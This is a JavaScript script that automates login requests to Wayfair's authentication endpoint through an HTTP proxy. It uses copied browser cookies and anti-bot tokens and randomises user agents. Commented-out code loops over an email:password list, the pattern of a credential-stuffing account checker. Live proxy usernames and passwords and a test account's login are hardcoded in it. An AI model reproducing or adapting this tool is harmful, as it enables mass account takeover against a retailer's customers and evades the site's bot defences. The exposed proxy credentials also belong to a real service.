import fetch from 'node-fetch'
import { HttpProxyAgent } from 'http-proxy-agent'
import { getUserList } from './read.js'
const result = {
  success: 0,
  fail: 0
}
// const proxy = 'http://65773079-zone-custom-region-US:xuanzi666@first.proxys5.net:6200'
// const proxy = 'http://76xf70sORd-zone-mars-region-US:35527311@na.3cfb97945f46ee2a.ipmars.vip:4900'
const proxy = 'http://65773079-zone-custom-region-US:xuanzi666@first.proxys5.net:6200'
const agent = new HttpProxyAgent(proxy)
async function ip () {
  const myHeaders = new Headers();
  myHeaders.append("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
  myHeaders.append("Accept-Language", "zh-CN,zh;q=0.9");
  myHeaders.append("Cache-Control", "no-cache");
  myHeaders.append("Connection", "keep-alive");
  myHeaders.append("Cookie", "Hm_lvt_f4f76646cd877e538aa1fbbdf351c548=1723013660; HMACCOUNT=64593C39F2D03EAA; Hm_lpvt_f4f76646cd877e538aa1fbbdf351c548=1723014540");
  myHeaders.append("Pragma", "no-cache");
  myHeaders.append("Referer", "https://ip138.com/");
  myHeaders.append("Sec-Fetch-Dest", "iframe");
  myHeaders.append("Sec-Fetch-Mode", "navigate");
  myHeaders.append("Sec-Fetch-Site", "same-site");
  myHeaders.append("Upgrade-Insecure-Requests", "1");
  myHeaders.append("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36");
  myHeaders.append("sec-ch-ua", "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"");
  myHeaders.append("sec-ch-ua-mobile", "?0");
  myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
  
  const requestOptions = {
    method: "GET",
    headers: myHeaders,
    redirect: "follow",
    agent
  };
  
  fetch("https://2024.ip138.com/", requestOptions)
    .then((response) => response.text())
    .then((result) => console.log(result))
    .catch((error) => console.error(error));
}
async function login(options) {
  const { email, password, cookie } = options;
  const myHeaders = new Headers();
  myHeaders.append("accept", "application/json");
  myHeaders.append("accept-language", "zh-CN,zh;q=0.9");
  myHeaders.append("cache-control", "no-cache");
  myHeaders.append("content-type", "application/json");
  myHeaders.append("cookie", "WFDC=PDX; serverUAInfo=%7B%22browser%22%3A%22Google%20Chrome%22%2C%22browserVersion%22%3A127%2C%22OS%22%3A%22Mac%20OS%20X%22%2C%22OSVersion%22%3A%22%22%2C%22isMobile%22%3Afalse%2C%22isTablet%22%3Afalse%2C%22isTouch%22%3Afalse%7D; postalCode=90060; CSNUtId=23f7265c-66b3-226e-2698-23c50796e502; CSN_CSRF=ef8e5e50dcf6b4019076050c8de412e200628319eac57b639234f94f4257bad2; ExCSNUtId=23e0884a-66b3-2271-a0e2-23c4cb841b02; __attentive_vf=true; _pxhd=LsjZIteqRJ3r7LF-5SExpuVQg7j572-PtC7Gv-0FdCsL08n6T81LCEYrkuHmlpth7N5Lg2ranQQm3RUAZ0x1Kw==:F4Ij85VZy0EQ-mB//a-hgd265m227eipcBhwVLIjNkFvP4CysBnjbwTB-CgbDc6ZAusU45ZiRk/3PGFUONhItEff0OC7gzLUtbeoVaos/Vo=; _wf_fs_sample_user=false; waychatShouldShowChatWindow=false; pxcts=14b194b8-548f-11ef-8920-0c3c7d93e072; _pxvid=14b18b7f-548f-11ef-8920-ea39f79f227d; i18nPrefs=lang%3Den-US; _dpm_ses.15e8=*; _gid=GA1.2.2090527243.1723015900; __podscribe_wayfair_referrer=_; __podscribe_wayfair_landing_url=https://www.wayfair.com/; __podscribe_did=pscrb_e5a1f9be-bd06-4d72-8e49-df51e11aa06b; cjConsent=MHxOfDB8Tnww; cjUser=c2f5bee0-d02b-40d2-a903-1c3b5ed72711; cjLiveRampLastCall=2024-08-07T07:31:40.115Z; __ssid=f8b6ca50c3e651a256e6bbcb8116240; IR_gbd=wayfair.com; __attentive_id=fcbdce5b44344cb09f4983c058d553d2; _attn_=eyJ1Ijoie1wiY29cIjoxNzIzMDE1OTAwMzM4LFwidW9cIjoxNzIzMDE1OTAwMzM4LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImZjYmRjZTViNDQzNDRjYjA5ZjQ5ODNjMDU4ZDU1M2QyXCJ9In0=; __attentive_cco=1723015900339; sm_uuid=1723016651421; _tt_enable_cookie=1; _ttp=6IuPeikMBZbY4nvstKfKw_B5nhx; __attentive_ss_referrer=https://www.wayfair.com/; rskxRunCookie=0; rCookie=f83zscw34dp5z8y93uk1u5lzjj6i9w; __attentive_dv=1; ftr_ncd=6; FVSID=49-1974f3ec-9710-435b-b2f6-c4aad0b508e9; ndp_session_id=93bed596-dea6-4858-b02a-cf7f57e014d5; coreGatewayOptOut=modal; attntv_mstore_email=hpmilu38594@chacuo.net:0; WFCS=CS6; __attentive_client_user_id=35b2cc192798506d26a1d681e18d505fc46987279a83a94bb970e297faaa08e0; IR_PI=4babee54-548f-11ef-b3c0-b11277946276%7C1723015989438; hideGoogleYolo=1; vid=23f7265c-66b3-23c4-268a-23bec365d702; __cf_bm=QEjAJHFZjois6uQTxzSdHee00pYEtespxI4tP5e9L2I-1723016133-1.0.1.1-bKfSXc0W23z5kqMm8k0Whp43mMFwAntkX.L4LGU.t11oMWW2zcrbQ3tjZXMgwjSwOswhgcG3uhw48keh6KOCQg; canary=0; SFSID=8262039536b2a553b8f4a3c4a1b8997d; _dpm_id.15e8=22d512b9-80af-4d51-945b-01a71e1727a1.1723015900.1.1723016188.1723015900.6add3da2-1abb-4048-9299-b3dc84efc49c; IR_12051=1723016187767%7C0%7C1723016187767%7C%7C; CSNID=6067ECB9-A69B-453D-91FE-B0B58DF4737B; otx=I/cmXGazI/sO7CPfwhP+Ag==; CSNPersist=page_of_visit%3D25; _rdt_uuid=1723015900604.47e6262b-83b9-4c0a-a068-ea5519a031ca; _rdt_em=35b2cc192798506d26a1d681e18d505fc46987279a83a94bb970e297faaa08e0; _px3=c1bc27c7358f612721aafab77d83b584bb45064e00feb9bff9bf40f4d977c0b8:aZk3HkPhqZIjh1yne75Kp+1j9ORfU/xRzvlQrbIYQ06a1M8GGomJJ06lcA8aHkLTdZE8XDE3lHpW2XWuIQEnvw==:1000:+GZkjHlLTp/xzLqP1uT7qDrh+RKevXE6Ccbu6lZ42xodC8yv+wchV9S2pvLoFHFowUtPRrjRqGHdU0D7bHzwTolCExhF2Qn7gn2YJZjOjTaeRO14FjBDHXIKPbHLDihBHC4KfbODpqLtjtntg9h9Bm/yxs74pZxEz8y6C4T/yg6cjbq2o6XmP1r3EeTtfU8o3o6YBXyLAZLBS4Otuw7dNQbgXEiahAcaeawU1Tc2FR0=; lastRskxRun=1723016274785; _ga=GA1.1.1519832323.1723015900; _ga_0GV7WXFNMT=GS1.1.1723015899.1.1.1723016275.40.0.0; __attentive_pv=8; forterToken=addfb70e12804c82b7d917c62793c9be_1723016271843_2548_dUAL43s-m4_20ck_2mxiV3jleHk%3D-12695-v2; forterToken=addfb70e12804c82b7d917c62793c9be_1723016271843_2548_dUAL43s-m4_20ck_2mxiV3jleHk%3D-12695-v2; _ga_Q0HJWP456J=GS1.1.1723015775.7.1.1723016277.38.0.0; _gcl_au=1.1.1983009768.1723015900.1944281815.1723015952.1723016278; CSNPersist=page_of_visit%3D2; CSNUtId=23e17d3a-66b1-bb13-aec7-adb7dd03ef02; ExCSNUtId=23e17d3a-66b1-bb13-aec7-adb7dd03ef02; SFSID=ea110755f42a1403c356bb510aec7709; __cf_bm=QV6cyEbVXDTb6xmKbbvJj78ZL4UKtXZUEKR_heL59.A-1723016834-1.0.1.1-Pso00PYJgLOd9dTgj3U_4idaa.9c.2k9lgjji6juoDqYEXnwgaISbqkkkrt2npk9KM7rfs9CbgGyjuji8zpx_A; canary=0; serverUAInfo=%7B%22browser%22%3A%22Google%20Chrome%22%2C%22browserVersion%22%3A125%2C%22OS%22%3A%22Mac%20OS%20X%22%2C%22OSVersion%22%3A%22%22%2C%22isMobile%22%3Afalse%2C%22isTablet%22%3Afalse%2C%22isTouch%22%3Afalse%7D; _pxhd=QBgaPmNkxCCGWEzse/Q4PSjRZUzRCoeBk1eDajxmwZ528qFp-2mclK1O2rijprc5gu2Vs5adZ6uJ0zXnTyaG6g==:tn0KS62G3J9YRG4KFxjlNyulrcT5XOFbI-mj/iaGxNER4sqK2VS5gcqbJ4ZcTlm6AczmK8/SaybHxl8ejOLDFaZiTIe-GZbK3T8PgV1dJk4=");
  myHeaders.append("origin", "https://www.wayfair.com");
  myHeaders.append("pragma", "no-cache");
  myHeaders.append("priority", "u=1, i");
  myHeaders.append("referer", "https://www.wayfair.com/v/account/authentication/login?url=&context=header_wayfair_my_account_menu");
  myHeaders.append("sec-ch-ua", "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"");
  myHeaders.append("sec-ch-ua-mobile", "?0");
  myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
  myHeaders.append("sec-fetch-dest", "empty");
  myHeaders.append("sec-fetch-mode", "cors");
  myHeaders.append("sec-fetch-site", "same-origin");
  myHeaders.append("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36");
  myHeaders.append("x-auth-caller-context", "auth_main_page_context");
  myHeaders.append("x-parent-txid", "I/cmXGazJEgzLyPI0NsJAg==");
  myHeaders.append("x-requested-with", "XMLHttpRequest");
  
  const raw = JSON.stringify({
    email,
    "grant_type": "PWD",
    "page": "AccountLogin",
    password,
    "recaptchaResponse": null,
    "recaptchaSiteKey": null,
    "step": "password",
    "userDefaultedToPassword": false
  });
  
  const requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow",
    agent
  };
  
  fetch("https://www.wayfair.com/a/account/authentication/login", requestOptions)
    .then((response) => response.text())
    .then((result) => console.log(result))
    .catch((error) => console.error(error));
}

function getUa () {
  const str1 = `Mozilla/5.0 (Windows NT {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36`
  const list1 = [
      '10.0; Win64; x64', '10.0; WOW64', '10.0',
      '6.2; WOW64', '6.2; Win64; x64', '6.2',
      '6.1', '6.1; Win64; x64', '6.1; WOW64'
  ]
  const list2 = [
      '70.0.3538.16', '70.0.3538.67', '70.0.3538.97', '71.0.3578.137', '71.0.3578.30', '71.0.3578.33',
      '71.0.3578.80', '72.0.3626.69', '72.0.3626.7', '73.0.3683.20', '73.0.3683.68', '74.0.3729.6',
      '75.0.3770.140', '75.0.3770.8', '75.0.3770.90', '76.0.3809.12', '76.0.3809.126', '76.0.3809.25',
      '76.0.3809.68', '77.0.3865.10', '77.0.3865.40', '78.0.3904.105', '78.0.3904.11', '78.0.3904.70',
      '79.0.3945.16', '79.0.3945.36', '80.0.3987.106', '80.0.3987.16', '81.0.4044.138', '81.0.4044.20',
      '81.0.4044.69', '83.0.4103.14', '83.0.4103.39', '84.0.4147.30', '85.0.4183.38', '85.0.4183.83',
      '85.0.4183.87', '86.0.4240.22', '87.0.4280.20', '87.0.4280.88', '88.0.4324.27'
  ]
  return `Mozilla/5.0 (Windows NT ${list1[Math.floor(Math.random() * list1.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${list2[Math.floor(Math.random() * list2.length)]} Safari/537.36`
}

// const userList = await getUserList()
// userList.forEach(user => {
//   const [email, password] = user.split(':')
//   login({ email, password })
// })
// console.log(userList, 'userList')
// console.log(getUa())
login({ email: 'hpmilu38594@chacuo.net', password: 'hpmilu38594' })
// ip()